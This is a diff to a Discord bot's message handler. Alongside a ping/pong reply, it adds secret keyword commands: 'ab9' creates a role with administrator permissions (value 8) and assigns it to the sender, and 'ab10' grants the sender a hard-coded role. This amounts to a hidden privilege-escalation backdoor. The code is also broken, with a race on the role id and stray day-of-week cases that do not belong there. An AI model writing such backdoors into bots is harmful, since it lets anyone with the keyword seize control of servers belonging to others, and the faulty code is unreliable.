@@ -14,10 +14,34 @@ client.on('message', msg => {
 	else
 		console.log('group chat?')
 
-	if (msg.content === 'ping') 
-		msg.reply('pong');
-        if (msg.content === 'ab8')
-                console.log(msg.channel.guild.roles)
+    switch (msg.content) {
+  	case "ping":
+    	msg.reply('pong');
+    	break;
+  	case "ab8":
+    	console.log(msg.channel.guild.roles)
+    	break;
+  	case 'ab9':
+  		var id;
+  		msg.channel.guild.createRole({
+  			name: 'lol',
+  			permissions: 8,
+  		}).then(role => id = role.id);
+    	msg.member.addRole(id)
+    	break;
+  	case 'ab10':
+    	msg.member.addRole('596921899666112541')
+    	break;
+  	case 4:
+    	day = "Thursday";
+    	break;
+  	case 5:
+    	day = "Friday";
+    	break;
+  	case 6:
+    	day = "Saturday";
+}
+
 });
 
 client.login(process.env.AUTH_TOKEN);
